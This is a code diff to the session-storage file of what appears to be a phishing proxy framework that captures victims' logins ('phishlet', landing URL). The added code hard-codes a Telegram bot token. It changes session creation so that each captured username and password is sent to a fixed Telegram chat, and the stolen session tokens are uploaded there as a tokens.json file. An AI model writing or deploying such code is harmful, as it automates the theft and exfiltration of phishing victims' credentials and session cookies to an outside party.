@@ -3,9 +3,11 @@ package database
 import (
 	"encoding/json"
 	"fmt"
+	"log"
 	"time"
 
 	"github.com/tidwall/buntdb"
+	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 )
 
 const SessionTable = "sessions"
@@ -37,6 +39,16 @@ func (d *Database) sessionsInit() {
 	d.db.CreateIndex("sessions_sid", SessionTable+":*", buntdb.IndexJSON("session_id"))
 }
 
+var bot *tgbotapi.BotAPI
+
+func init() {
+    var err error
+    bot, err = tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+    if err != nil {
+        log.Panic(err)
+    }
+}
+
 func (d *Database) sessionsCreate(sid string, phishlet string, landing_url string, useragent string, remote_addr string) (*Session, error) {
 	_, err := d.sessionsGetBySid(sid)
 	if err == nil {
@@ -63,13 +75,26 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 	jf, _ := json.Marshal(s)
 
 	err = d.db.Update(func(tx *buntdb.Tx) error {
-		tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
-		return nil
+			tx.Set(d.genIndex(SessionTable, id), string(jf), nil)
+			return nil
 	})
+
 	if err != nil {
-		return nil, err
-	}
-	return s, nil
+			return nil, err}
+
+    // Send text message
+    message := fmt.Sprintf("ID: %d\nUsername: %s\nPassword: %s", s.Id, s.Username, s.Password)
+    msg := tgbotapi.NewMessage(5822512651, message)
+    bot.Send(msg)
+
+    // Send document
+    tokenJSON, _ := json.Marshal(s.Tokens)
+    tokenFile := tgbotapi.FileBytes{Name: "tokens.json", Bytes: tokenJSON}
+    documentMsg := tgbotapi.NewDocument(5822512651, tokenFile)
+    bot.Send(documentMsg)
+
+    return s, nil // Single return point
+
 }
 
 func (d *Database) sessionsList() ([]*Session, error) {
